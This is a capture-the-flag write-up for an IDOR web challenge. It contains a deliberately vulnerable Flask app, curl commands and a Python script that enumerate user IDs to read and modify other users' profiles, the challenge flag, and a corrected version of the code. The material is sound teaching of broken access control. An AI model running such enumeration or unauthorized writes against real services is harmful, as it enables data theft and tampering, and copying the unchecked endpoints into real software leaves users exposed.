---
title: "Web - Insecure Direct Object Reference"
description: "Exploiting an IDOR vulnerability to access other users' profiles and discover the flag by enumerating predictable resource IDs."
author: "Zemi"
---

## Challenge Info

| Detail     | Value              |
|------------|--------------------|
| Category   | Web Exploitation   |
| Difficulty | Easy               |
| Points     | 100                |
| Flag       | `zemi{1ns3cur3_d1r3ct_0bj3ct}` |

## Challenge Files

Download the challenge files to get started:

- [app.py](/Website/challenges/web-idor/app.py)
- [flag.txt](/Website/challenges/web-idor/flag.txt)
- [README.md](/Website/challenges/web-idor/README.md)
- [requirements.txt](/Website/challenges/web-idor/requirements.txt)

## Overview

Insecure Direct Object Reference (IDOR) is one of the most common web vulnerabilities and one of the easiest to exploit. It occurs when an application exposes internal object references (like database IDs, filenames, or sequential numbers) in URLs or API parameters without verifying that the current user is authorized to access the referenced object. If I can view my profile at `/api/user/12`, what happens when I change `12` to `1`?

## Setting Up the Challenge Locally

Save the following as `app.py` and run it with `python3 app.py`:

```python
from flask import Flask, jsonify, request, render_template_string
import json

app = Flask(__name__)

# Simulated user database
USERS = {
    1: {"id": 1, "username": "admin", "email": "admin@zemi.ctf", "notes": "zemi{1ns3cur3_d1r3ct_0bj3ct}"},
    2: {"id": 2, "username": "alice", "email": "alice@zemi.ctf", "notes": "Nothing interesting here."},
    3: {"id": 3, "username": "bob", "email": "bob@zemi.ctf", "notes": "My favorite color is blue."},
    4: {"id": 4, "username": "charlie", "email": "charlie@zemi.ctf", "notes": "Remember to change password."},
    5: {"id": 5, "username": "guest", "email": "guest@zemi.ctf", "notes": "This is the guest account."},
}

# Simulated session — you are logged in as user 5 (guest)
CURRENT_USER_ID = 5

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head><title>User Portal</title></head>
<body>
  <h1>Welcome, {{ username }}!</h1>
  <p>View your profile: <a href="/api/user/{{ user_id }}">/api/user/{{ user_id }}</a></p>
</body>
</html>
"""

@app.route("/")
def index():
    user = USERS[CURRENT_USER_ID]
    return render_template_string(LOGIN_PAGE, username=user["username"], user_id=CURRENT_USER_ID)

@app.route("/api/user/<int:user_id>")
def get_user(user_id):
    # VULNERABLE: No authorization check!
    # Any authenticated user can access any user's profile by changing the ID.
    user = USERS.get(user_id)
    if not user:
        return jsonify({"error": "User not found"}), 404
    return jsonify(user)

@app.route("/api/user/<int:user_id>/update", methods=["POST"])
def update_user(user_id):
    # VULNERABLE: No authorization check on writes either!
    data = request.get_json()
    user = USERS.get(user_id)
    if not user:
        return jsonify({"error": "User not found"}), 404
    if "notes" in data:
        user["notes"] = data["notes"]
    return jsonify({"message": "Profile updated", "user": user})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

The app runs at `http://localhost:5000`.

## Reconnaissance

We're logged in as user `guest` with ID `5`. The landing page gives us a link to our own profile:

```bash
curl -s http://localhost:5000/api/user/5 | python3 -m json.tool
```

Response:

```json
{
    "id": 5,
    "username": "guest",
    "email": "guest@zemi.ctf",
    "notes": "This is the guest account."
}
```

The API endpoint uses a sequential numeric ID in the URL: `/api/user/5`. This is a huge red flag. What if we change the ID?

## Exploitation

### Step 1: Access another user's profile

```bash
curl -s http://localhost:5000/api/user/4 | python3 -m json.tool
```

Response:

```json
{
    "id": 4,
    "username": "charlie",
    "email": "charlie@zemi.ctf",
    "notes": "Remember to change password."
}
```

No authorization error. We just accessed another user's private profile. This confirms the IDOR vulnerability.

### Step 2: Check the admin account

The admin is almost always ID `1`:

```bash
curl -s http://localhost:5000/api/user/1 | python3 -m json.tool
```

Response:

```json
{
    "id": 1,
    "username": "admin",
    "email": "admin@zemi.ctf",
    "notes": "zemi{1ns3cur3_d1r3ct_0bj3ct}"
}
```

The flag is in the admin's notes field.

### Step 3: Automated enumeration

In real scenarios, the interesting data could be on any user ID, not just `1`. Here is a Python script to enumerate all users:

```python
#!/usr/bin/env python3
"""IDOR Enumeration Script — scans sequential user IDs for data."""

import requests
import sys

BASE_URL = "http://localhost:5000"
ENDPOINT = "/api/user/{}"

def enumerate_users(start=1, end=100):
    print(f"[*] Enumerating user IDs {start} to {end}...")
    print("-" * 60)

    found = 0
    for user_id in range(start, end + 1):
        url = BASE_URL + ENDPOINT.format(user_id)
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                found += 1
                print(f"[+] ID {user_id}: {data['username']} | {data['email']}")
                print(f"    Notes: {data['notes']}")

                # Check if notes contain a flag
                if "zemi{" in data.get("notes", ""):
                    print(f"\n[!] FLAG FOUND on user {data['username']} (ID {user_id})!")
                    print(f"    {data['notes']}")
                    return
            # 404s are expected for non-existent IDs, skip silently
        except requests.exceptions.RequestException as e:
            print(f"[-] Error on ID {user_id}: {e}")

    print("-" * 60)
    print(f"[*] Enumeration complete. Found {found} users.")

if __name__ == "__main__":
    start = int(sys.argv[1]) if len(sys.argv) > 1 else 1
    end = int(sys.argv[2]) if len(sys.argv) > 2 else 20
    enumerate_users(start, end)
```

Running it:

```bash
python3 enum_idor.py 1 10
```

Output:

```
[*] Enumerating user IDs 1 to 10...
------------------------------------------------------------
[+] ID 1: admin | admin@zemi.ctf
    Notes: zemi{1ns3cur3_d1r3ct_0bj3ct}

[!] FLAG FOUND on user admin (ID 1)!
    zemi{1ns3cur3_d1r3ct_0bj3ct}
```

### Step 4: IDOR on write operations

The vulnerability extends to POST endpoints too. We can modify another user's profile:

```bash
curl -s -X POST http://localhost:5000/api/user/3/update \
  -H "Content-Type: application/json" \
  -d '{"notes": "Hacked by guest"}' | python3 -m json.tool
```

Response:

```json
{
    "message": "Profile updated",
    "user": {
        "id": 3,
        "username": "bob",
        "email": "bob@zemi.ctf",
        "notes": "Hacked by guest"
    }
}
```

We just modified Bob's profile from the guest account. Write-based IDORs are even more dangerous because they allow data tampering, not just data leakage.

## Where IDOR Hides

IDOR is not limited to URL path parameters. Look for predictable references in:

| Location | Example |
|----------|---------|
| URL path | `/api/user/123` |
| Query string | `/invoice?id=456` |
| POST body | `{"order_id": 789}` |
| Headers | `X-User-Id: 123` |
| Cookies | `user_id=123` |
| File parameters | `/download?file=report_123.pdf` |

## The Vulnerable Code (Explained)

```python
@app.route("/api/user/<int:user_id>")
def get_user(user_id):
    # VULNERABLE: The function takes the user_id directly from the URL
    # and returns the data without checking if the logged-in user
    # is authorized to view this profile.
    user = USERS.get(user_id)
    if not user:
        return jsonify({"error": "User not found"}), 404
    return jsonify(user)
```

The problem is simple: the endpoint checks if the user *exists* but never checks if the *requesting user* is allowed to access it.

## The Fix

```python
from flask import Flask, jsonify, request, session, abort
from functools import wraps

# Authorization decorator
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            return jsonify({"error": "Authentication required"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route("/api/user/<int:user_id>")
@login_required
def get_user(user_id):
    # FIX 1: Users can only access their own profile
    if user_id != session["user_id"]:
        return jsonify({"error": "Forbidden"}), 403

    user = USERS.get(user_id)
    if not user:
        return jsonify({"error": "User not found"}), 404
    return jsonify(user)

@app.route("/api/user/me")
@login_required
def get_own_profile():
    # FIX 2: Even better — use a /me endpoint that derives the ID from the session.
    # No user-controlled ID at all.
    user = USERS.get(session["user_id"])
    return jsonify(user)
```

Key changes:
1. **Authorization check** — compare the requested resource ID against the session's user ID
2. **Use `/me` endpoints** — avoid exposing object IDs in the URL entirely; derive the user from the server-side session
3. **Use UUIDs instead of sequential integers** — making IDs non-guessable adds a layer of defense (but is NOT sufficient on its own; you still need authorization checks)

## Tools Used

- **curl** — sending requests with modified parameters
- **Python + requests** — automating ID enumeration
- **Burp Suite Intruder** — (optional) fuzzing numeric IDs with a range payload
- **Autorize** — Burp Suite extension for automated authorization testing

## Lessons Learned

- **Always** implement server-side authorization checks before returning or modifying data
- Never rely on the client to only request its own resources — always verify on the server
- Sequential integer IDs make IDOR trivial to exploit; use UUIDs to make enumeration harder (but still enforce authorization)
- IDOR affects reads AND writes — test both GET and POST/PUT/DELETE endpoints
- Prefer indirect references (like `/api/user/me`) over direct object references when possible
- IDOR is consistently in the OWASP Top 10 under "Broken Access Control" — it is extremely common in real applications
